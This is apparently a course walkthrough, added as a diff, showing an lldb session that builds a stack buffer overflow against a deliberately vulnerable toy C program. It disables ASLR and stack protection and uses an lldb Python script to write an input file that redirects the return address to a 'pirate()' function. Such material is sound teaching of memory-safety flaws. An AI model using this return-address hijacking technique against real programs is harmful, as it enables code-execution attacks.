@@ -1,0 +1,397 @@
+# -----------------------------------------------
+# Crafting an attack by buffer overflow
+# -----------------------------------------------
+# Disable ASLR protection for the current session
+# Note: this creates a security risk for the current login session!!!
+#  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+# 
+# Enable ASLR again
+#  echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
+#
+# Compile helloFakedReturn.c with additional gcc options:
+#   -Wno-array-bounds -fno-stack-protector -fomit-frame-pointer
+
+lldb bin/helloFakedReturn
+
+
+(lldb)
+
+b main
+b get_name
+run
+
+   41  	}
+   42
+   43  	int main() {
+-> 44  		char *name=NULL;
+   45  	        printf("ASLR test: main is at %p\n", &main);
+   46  		name = get_name();
+   47  		if (name != NULL){
+
+(lldb) dd
+helloFakedReturn, main
+    0    0x555555554806 <+0>:    subq  $0x18,  %rsp
+->  1    0x55555555480a <+4>:    movq  $0x0,  0x8(%rsp)
+    2    0x555555554813 <+13>:   leaq  -0x14(%rip),  %rsi <+0> at helloFakedReturn.c:43
+    3    0x55555555481a <+20>:   leaq  0x130(%rip),  %rdi
+    4    0x555555554821 <+27>:   movl  $0x0,  %eax
+   *5    0x555555554826 <+32>:   callq 0x555555554620  ; printf
+    6    0x55555555482b <+37>:   movl  $0x0,  %eax
+   *7    0x555555554830 <+42>:   callq 0x5555555547d2  ; get_name
+    8    0x555555554835 <+47>:   movq  %rax,  0x8(%rsp)
+    9    0x55555555483a <+52>:   cmpq  $0x0,  0x8(%rsp)
+   *10   0x555555554840 <+58>:   je    0x555555554868 <+98> at helloFakedReturn.c:51
+    11   0x555555554842 <+60>:   movq  0x8(%rsp),  %rax
+    12   0x555555554847 <+65>:   movq  %rax,  %rsi
+    13   0x55555555484a <+68>:   leaq  0x11a(%rip),  %rdi
+    14   0x555555554851 <+75>:   movl  $0x0,  %eax
+   *15   0x555555554856 <+80>:   callq 0x555555554620  ; printf
+    16   0x55555555485b <+85>:   movq  0x8(%rsp),  %rax
+    17   0x555555554860 <+90>:   movq  %rax,  %rdi
+   *18   0x555555554863 <+93>:   callq 0x555555554600  ; free
+    19   0x555555554868 <+98>:   movl  $0x0,  %eax
+    20   0x55555555486d <+103>:  addq  $0x18,  %rsp
+   *21   0x555555554871 <+107>:  retq
+
+
+# Behold!
+# Return address from the fake is not the normal return address from get_name
+#   0x555555554835
+# but the address of the command retq (assembler command #21)
+#   0x555555554871
+
+(lldb) p/x $sp
+(unsigned long) $0 = 0x00007fffffffdd70
+
+# print portion of the stack
+
+(lldb) x/64xb $sp
+0x7fffffffdd70: 0x60 0xde 0xff 0xff 0xff 0x7f 0x00 0x00
+0x7fffffffdd78: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x7fffffffdd80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x7fffffffdd88: 0x87 0x3c 0xa0 0xf7 0xff 0x7f 0x00 0x00
+0x7fffffffdd90: 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x7fffffffdd98: 0x68 0xde 0xff 0xff 0xff 0x7f 0x00 0x00
+0x7fffffffdda0: 0x00 0x80 0x00 0x00 0x01 0x00 0x00 0x00
+0x7fffffffdda8: 0x06 0x48 0x55 0x55 0x55 0x55 0x00 0x00
+
+(lldb) cont
+
+   35  	        
+   36  	char* get_name(){
+   37  		char buf[15];      // a buffer for 14 + 1 characters
+-> 38  		printf("Please insert your surname (15 characters max): ");
+   39  	        gets_unsave(buf);
+   40  		return strdup(buf);  // return a copy of the name on the heap
+   41  	}
+
+# 2 * next
+# Enter name: Peter
+
+Please insert your surname (15 characters max): Peter
+
+   37  		char buf[15];      // a buffer for 14 + 1 characters
+   38  		printf("Please insert your surname (15 characters max): ");
+   39  	        gets_unsave(buf);
+-> 40  		return strdup(buf);  // return a copy of the name on the heap
+   41  	}
+
+# Inspect the buffer filled with String "Peter"
+
+(lldb) x/72xb $sp
+0x7fffffffdd50: 0x40 0x50 0x65 0x74 0x65 0x72 0x00 0x00 buf starts at 0x7fffffffdd51
+0x7fffffffdd58: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x7fffffffdd60: 0x80 0x48 0x55 0x55 0x55 0x55 0x00 0x00 
+0x7fffffffdd68: 0x35 0x48 0x55 0x55 0x55 0x55 0x00 0x00 ret addr to main
+0x7fffffffdd70: 0x60 0xde 0xff 0xff 0xff 0x7f 0x00 0x00
+0x7fffffffdd78: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x7fffffffdd80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x7fffffffdd88: 0x87 0x3c 0xa0 0xf7 0xff 0x7f 0x00 0x00 ret addr to caller of main
+0x7fffffffdd90: 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+--- create some adhoc script that dumps faked input to file
+
+(lldb) script
+Python Interactive Interpreter. To exit, type 'quit()', 'exit()' or Ctrl-D.
+
+# enter the following python code into the interactive script session
+
+from __future__ import print_function
+import binascii
+
+frame = lldb.frame
+process = lldb.process
+target = lldb.target
+
+arch_size = process.GetAddressByteSize()
+def store_arch_word_in_blob(blob, size, offset, value):
+    blob[offset:offset+size] = value
+
+# Version independant function for converting arbitrary integers to a list of bytes
+# respecting the endianness
+def integer_to_byte_array(number, asize, is_little_endian):
+    byte_array = []
+    count = asize
+    while count > 0:
+        byte_array = [number % 256] + byte_array
+        number = number // 256
+        count -= 1
+    if is_little_endian:
+        return byte_array[::-1]
+    else:
+        return byte_array
+
+# Size of buffer we like to overflow
+size_of_buf = 15
+
+# Address of function we like to run by return capture
+pirate_addr = target.EvaluateExpression('&pirate').GetValueAsUnsigned()
+
+# Address of buffer
+addr_buf = frame.FindVariable('buf').GetAddress().load_addr
+
+# Address where the original return address to main sits in the stack
+# Important: adapt the factor (here 1) for the offset to your stack layout
+addr_return_to_main = addr_buf + size_of_buf + 1* arch_size
+
+# Faked return address into code of main
+faked_ret_main = int(0x555555554871)
+
+# Read information from the original stack
+#   from begin of buf downto the stack address where the return address of
+#   the caller of main is residing
+#
+# Important: adapt the factor (here 6) for the offset to your stack layout
+bytes_to_read = size_of_buf + 6 * arch_size
+err = lldb.SBError()
+stack_blob = process.ReadMemory(addr_buf,bytes_to_read, err)
+
+# Now, we create a faked stack content
+# Create new byte array blob of appropriate size
+# According to our stack layout, we fake the content of buf
+# and 4 stack words more for implanting our hack
+size_to_fake = size_of_buf + 4 * arch_size
+newblob = [0] * size_to_fake
+
+# Fill the faked blob
+# override the buffer with 'A' characters; buf is terminated by initialization with 0
+for offset in range(0,size_of_buf-1,1):
+    newblob[offset] = 0x41
+
+# Fake the start address of pirate() as return address
+# Compute offset from start of blob to the place where we implant the faked return address
+offset_ret_to_main  = size_of_buf + 1*arch_size
+
+# Replace correct return address to main by start address of function pirate()
+store_arch_word_in_blob(newblob, arch_size, offset_ret_to_main, list(integer_to_byte_array(pirate_addr,arch_size,True)))
+
+# Implant the faked return address to main, which implements the return from function pirate()
+store_arch_word_in_blob(newblob, arch_size, offset_ret_to_main + 1* arch_size, list(integer_to_byte_array(faked_ret_main,arch_size,True)))
+
+# Move the return address to the function that called main, which implements the return from function main() 
+store_arch_word_in_blob(newblob, arch_size, offset_ret_to_main + 2* arch_size, stack_blob[offset_ret_to_main+4*arch_size:offset_ret_to_main+5*arch_size])
+
+# Write newblob to file 'fakeinput'
+newbuf = bytearray(newblob)
+with open ("fakeinput", "wb") as bindata:
+    bindata.write(newbuf)
+
+# For inspection and an interactive test in the debugger
+# Write the new stack blob to memory
+err = lldb.SBError()
+stack_blob = process.WriteMemory(addr_buf,newbuf, err)
+
+# exit script mode; type Ctrl-D
+
+# Inspect the hacked stack contents
+
+(lldb) x/64xb $sp
+0x7fffffffdd50: 0x40 0x41 0x41 0x41 0x41 0x41 0x41 0x41  faked buf
+0x7fffffffdd58: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x00  buf ends here
+0x7fffffffdd60: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00  filler due to stack layout
+0x7fffffffdd68: 0x6a 0x47 0x55 0x55 0x55 0x55 0x00 0x00  faked return address pointing to pirate()
+0x7fffffffdd70: 0x71 0x48 0x55 0x55 0x55 0x55 0x00 0x00  faked return into code of main
+0x7fffffffdd78: 0x87 0x3c 0xa0 0xf7 0xff 0x7f 0x00 0x00  moved return address to caller of main
+0x7fffffffdd80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x7fffffffdd88: 0x87 0x3c 0xa0 0xf7 0xff 0x7f 0x00 0x00  original return address to caller of main
+
+# Interactive test of our fake in the debugger
+
+(lldb) dd
+helloFakedReturn, get_name
+    0    0x5555555547d2 <+0>:    subq  $0x18,  %rsp  
+    1    0x5555555547d6 <+4>:    leaq  0x143(%rip),  %rdi  
+    2    0x5555555547dd <+11>:   movl  $0x0,  %eax  
+   *3    0x5555555547e2 <+16>:   callq 0x555555554620  ; printf
+    4    0x5555555547e7 <+21>:   leaq  0x1(%rsp),  %rax  
+    5    0x5555555547ec <+26>:   movq  %rax,  %rdi  
+   *6    0x5555555547ef <+29>:   callq 0x555555554780  ; gets_unsave
+->  7    0x5555555547f4 <+34>:   leaq  0x1(%rsp),  %rax  
+    8    0x5555555547f9 <+39>:   movq  %rax,  %rdi  
+   *9    0x5555555547fc <+42>:   callq 0x555555554640  ; strdup
+    10   0x555555554801 <+47>:   addq  $0x18,  %rsp  
+   *11   0x555555554805 <+51>:   retq    
+
+# Advance to operation retq: 4* ni
+
+   38  		printf("Please insert your surname (15 characters max): ");
+   39  	        gets_unsave(buf);
+   40  		return strdup(buf);  // return a copy of the name on the heap
+-> 41  	}
+   42
+
+(lldb) dd
+helloFakedReturn, get_name
+    0    0x5555555547d2 <+0>:    subq  $0x18,  %rsp
+    1    0x5555555547d6 <+4>:    leaq  0x143(%rip),  %rdi
+    2    0x5555555547dd <+11>:   movl  $0x0,  %eax
+   *3    0x5555555547e2 <+16>:   callq 0x555555554620  ; printf
+    4    0x5555555547e7 <+21>:   leaq  0x1(%rsp),  %rax
+    5    0x5555555547ec <+26>:   movq  %rax,  %rdi
+   *6    0x5555555547ef <+29>:   callq 0x555555554780  ; gets_unsave
+    7    0x5555555547f4 <+34>:   leaq  0x1(%rsp),  %rax
+    8    0x5555555547f9 <+39>:   movq  %rax,  %rdi
+   *9    0x5555555547fc <+42>:   callq 0x555555554640  ; strdup
+    10   0x555555554801 <+47>:   addq  $0x18,  %rsp
+-> *11   0x555555554805 <+51>:   retq
+
+(lldb) x/32bx $sp
+
+0x7fffffffdd68: 0x6a 0x47 0x55 0x55 0x55 0x55 0x00 0x00
+0x7fffffffdd70: 0x71 0x48 0x55 0x55 0x55 0x55 0x00 0x00
+0x7fffffffdd78: 0x87 0x3c 0xa0 0xf7 0xff 0x7f 0x00 0x00
+0x7fffffffdd80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+# 'return to' function pirate():  ni 
+
+   13  	#include <stdlib.h>
+   14  	#include <stdbool.h>
+   15
+-> 16  	void pirate(){
+   17  		printf("You have been hacked!\n");
+   18  	}
+
+(lldb) dd
+helloFakedReturn, pirate
+->  0    0x55555555476a <+0>:    subq  $0x8,  %rsp
+    1    0x55555555476e <+4>:    leaq  0x193(%rip),  %rdi
+   *2    0x555555554775 <+11>:   callq 0x555555554610  ; puts
+    3    0x55555555477a <+16>:   nop
+    4    0x55555555477b <+17>:   addq  $0x8,  %rsp
+   *5    0x55555555477f <+21>:   retq
+
+# Advance to operation retq: 5*ni
+
+You have been hacked!
+
+   15
+   16  	void pirate(){
+   17  		printf("You have been hacked!\n");
+-> 18  	}
+
+(lldb) dd
+
+helloFakedReturn, pirate
+    0    0x55555555476a <+0>:    subq  $0x8,  %rsp
+    1    0x55555555476e <+4>:    leaq  0x193(%rip),  %rdi
+   *2    0x555555554775 <+11>:   callq 0x555555554610  ; puts
+    3    0x55555555477a <+16>:   nop
+    4    0x55555555477b <+17>:   addq  $0x8,  %rsp
+-> *5    0x55555555477f <+21>:   retq
+
+(lldb) 
+
+(lldb) x/32bx $sp
+0x7fffffffdd70: 0x71 0x48 0x55 0x55 0x55 0x55 0x00 0x00   faked return into code of main
+0x7fffffffdd78: 0x87 0x3c 0xa0 0xf7 0xff 0x7f 0x00 0x00   moved return address to caller of main
+0x7fffffffdd80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x7fffffffdd88: 0x87 0x3c 0xa0 0xf7 0xff 0x7f 0x00 0x00   original return address to caller of main
+
+
+# Return to faked address in code of main: ni
+
+(lldb) dd
+helloFakedReturn, main
+    0    0x555555554806 <+0>:    subq  $0x18,  %rsp
+    1    0x55555555480a <+4>:    movq  $0x0,  0x8(%rsp)
+    2    0x555555554813 <+13>:   leaq  -0x14(%rip),  %rsi <+0> at helloFakedReturn.c:43
+    3    0x55555555481a <+20>:   leaq  0x130(%rip),  %rdi
+    4    0x555555554821 <+27>:   movl  $0x0,  %eax
+   *5    0x555555554826 <+32>:   callq 0x555555554620  ; printf
+    6    0x55555555482b <+37>:   movl  $0x0,  %eax
+   *7    0x555555554830 <+42>:   callq 0x5555555547d2  ; get_name
+    8    0x555555554835 <+47>:   movq  %rax,  0x8(%rsp)
+    9    0x55555555483a <+52>:   cmpq  $0x0,  0x8(%rsp)
+   *10   0x555555554840 <+58>:   je    0x555555554868 <+98> at helloFakedReturn.c:51
+    11   0x555555554842 <+60>:   movq  0x8(%rsp),  %rax
+    12   0x555555554847 <+65>:   movq  %rax,  %rsi
+    13   0x55555555484a <+68>:   leaq  0x11a(%rip),  %rdi
+    14   0x555555554851 <+75>:   movl  $0x0,  %eax
+   *15   0x555555554856 <+80>:   callq 0x555555554620  ; printf
+    16   0x55555555485b <+85>:   movq  0x8(%rsp),  %rax
+    17   0x555555554860 <+90>:   movq  %rax,  %rdi
+   *18   0x555555554863 <+93>:   callq 0x555555554600  ; free
+    19   0x555555554868 <+98>:   movl  $0x0,  %eax
+    20   0x55555555486d <+103>:  addq  $0x18,  %rsp
+-> *21   0x555555554871 <+107>:  retq
+
+
+(lldb) x/32bx $sp
+0x7fffffffdd78: 0x87 0x3c 0xa0 0xf7 0xff 0x7f 0x00 0x00
+0x7fffffffdd80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x7fffffffdd88: 0x87 0x3c 0xa0 0xf7 0xff 0x7f 0x00 0x00
+0x7fffffffdd90: 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+# Note:
+# We jumped over the code that sets the return value of main in register eax
+# Thus, the content of register eax is some code set during the fake
+
+(lldb) register read eax
+     eax = 0x00000016
+
+# Return to caller of function main
+# and let it terminate the process
+
+(lldb) cont
+Process 4276 resuming
+Process 4276 exited with status = 22 (0x00000016)
+
+# Exit the debugger: type Ctrl-D
+
+#------------
+
+$ lldb bin/helloFakedReturn
+
+(lldb) process launch -i fakeinput
+
+Process 2722 launched: '/home/regensbu/git_public_GdP1/CodeExamples/Playground/bin/helloFakedReturn' (x86_64)
+ASLR test: main is at 0x555555554806
+Please insert your surname (15 characters max): You have been hacked!
+Process 2722 stopped
+
+* thread #1, name = 'helloFakedRetur', stop reason = signal SIGSEGV: invalid address (fault address: 0xf7a03c87)
+    frame #0: 0x00000000f7a03c87
+error: memory read failed for 0xf7a03c00
+
+
+Note:
+You may or may not get a seg fault error by the code executed after return from main().
+  Here: (fault address: 0xf7a03c87)
+
+However, the hack of our user code succeededr anyways.
+
+#------------
+# If we fix the start address of main by disabling ASLR
+# we are able to use our hack from the command line as well
+#
+# Otherwise, we would get a 'Segmentation fault: 11'
+# since our faked return addresses are not correct.
+
+cat fakeinput | bin/helloFakedReturn
+
+ASLR test: main is at 0x555555554806
+Please insert your surname (15 characters max): You have been hacked!
+Speicherzugriffsfehler (Speicherabzug geschrieben)
+
+
+
